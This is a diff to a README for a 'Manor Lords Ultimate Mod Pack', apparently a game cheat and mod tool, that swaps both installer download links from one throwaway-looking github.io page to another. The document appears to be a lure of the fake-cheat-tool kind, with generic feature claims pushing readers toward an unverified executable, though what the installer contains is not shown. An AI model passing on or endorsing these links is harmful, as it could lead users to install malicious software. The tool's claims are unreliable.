@@ -2,7 +2,7 @@
 
 Manor Lords Ultimate Mod Pack is a comprehensive Windows desktop tool designed to elevate your Manor Lords gaming experience. This mod pack includes a suite of features such as infinite resources, save file editing, and unlocked buildings, allowing players to customize and enhance their gameplay seamlessly. Developed for the year 2026, it ensures compatibility with the latest updates and provides regular improvements for an optimized medieval simulation.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -70,7 +70,7 @@ A: Visit the official download page or community forums linked there to provide 
 
 To get started, download the latest version of the Manor Lords Ultimate Mod Pack from our official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: July 15, 2026. Version 2026.07.15.*
 
